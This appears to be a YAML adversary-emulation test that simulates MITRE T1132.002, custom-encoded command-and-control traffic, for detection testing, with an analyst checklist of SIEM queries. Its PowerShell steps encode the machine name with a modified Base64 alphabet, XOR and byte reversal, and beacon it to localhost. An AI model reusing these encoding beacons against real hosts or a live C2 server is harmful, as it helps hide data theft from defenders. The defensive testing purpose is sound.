id: T1132.002_data_encoding_nonstandard
name: "Data Encoding — Non-Standard Encoding"
mitre_technique: "T1132.002"
mitre_tactic: "command_and_control"
description: >
  Adversaries encode C2 traffic using custom or modified encoding schemes that
  deviate from standard Base64/hex to defeat decoders that recognise standard formats.
  Common patterns: modified Base64 alphabet (replacing +/= with custom chars),
  XOR with a rotating key, byte-reversal, or custom substitution ciphers.
  These schemes make automated decoding harder while keeping the implementation
  simple. Detection focuses on statistical anomalies in network data rather than
  known-signature matching.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1132/002/

steps:
  - step: 1
    type: marker
    description: "Pre-execution context"
    message: "Starting T1132.002 — Non-Standard Encoding C2 simulation"

  - step: 2
    type: exec_powershell
    description: "Simulate custom Base64 alphabet — modified charset defeats standard decoders"
    command: |
      Write-Host "[PAS] Custom Base64 alphabet encoding:"
      # Real C2: replaces standard +/= with custom chars to defeat regex matching
      $standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
      $custom   = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_!'

      $data    = "PAS-T1132.002-CUSTOM-B64|$env:COMPUTERNAME"
      $b64     = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
      $encoded = -join ($b64.ToCharArray() | ForEach-Object {
          $idx = $standard.IndexOf($_)
          if ($idx -ge 0) { $custom[$idx] } else { $_ }
      })
      Write-Host "[PAS] Standard B64: $b64"
      Write-Host "[PAS] Custom B64:   $encoded"
      Write-Host "[PAS] Standard decoder fails on custom alphabet — analyst must identify mapping"

      try {
          Invoke-WebRequest -Uri "http://127.0.0.1/c?d=$encoded" `
              -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null
      } catch {}

  - step: 3
    type: exec_powershell
    description: "Simulate XOR-encoded C2 beacon — single-byte XOR key"
    command: |
      Write-Host "[PAS] XOR-encoded C2 beacon (key=0x41):"
      $key  = 0x41
      $data = [Text.Encoding]::UTF8.GetBytes("PAS-T1132.002-XOR-BEACON|COMPUTERNAME=$env:COMPUTERNAME")
      $xored = $data | ForEach-Object { $_ -bxor $key }
      $encoded = [Convert]::ToBase64String([byte[]]$xored)
      Write-Host "[PAS] XOR+B64 encoded: $encoded"
      try {
          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/update")
          $req.Method = "POST"
          $req.Timeout = 500
          $body = [Text.Encoding]::UTF8.GetBytes($encoded)
          $req.ContentLength = $body.Length
          $s = $req.GetRequestStream()
          $s.Write($body, 0, $body.Length)
          $s.Close()
          $req.GetResponse() | Out-Null
      } catch {}
      Write-Host "[PAS] XOR-encoded POST beacon sent"

  - step: 4
    type: exec_powershell
    description: "Simulate byte-reversal encoding — reversed byte order in payload"
    command: |
      Write-Host "[PAS] Byte-reversal encoded C2:"
      $data    = [Text.Encoding]::UTF8.GetBytes("PAS-T1132.002-REVERSED-PAYLOAD")
      [Array]::Reverse($data)
      $encoded = [Convert]::ToBase64String($data)
      Write-Host "[PAS] Reversed+B64: $encoded"
      try {
          Invoke-WebRequest -Uri "http://127.0.0.1/ping?p=$encoded" `
              -TimeoutSec 1 -ErrorAction SilentlyContinue | Out-Null
      } catch {}
      Write-Host "[PAS] Byte-reversed beacon sent"

  - step: 5
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 3

  - step: 6
    type: marker
    description: "Post-execution prompt"
    message: "Check SIEM — high-entropy HTTP parameters that defeat standard Base64 decoding attempts"

cleanup:
  - step: 1
    type: marker
    description: "No persistent artifacts"
    message: "T1132.002 cleanup complete — no persistent artifacts"

analyst_checklist:
  - "Network event: HTTP parameters with high Shannon entropy that are not valid standard Base64"
  - "Network event: repeated HTTP POST bodies with consistent length and high entropy (XOR characteristic)"
  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'powershell.exe' and RemotePort == 80"
  - "CONTROL CHECK: NDR tools should flag high-entropy HTTP parameters regardless of encoding scheme"
  - "CONTROL CHECK: Machine-learning based network anomaly detection is required — signature matching cannot detect custom encodings"
  - "CONTROL CHECK: SSL inspection + content inspection for all outbound HTTPS from endpoints"
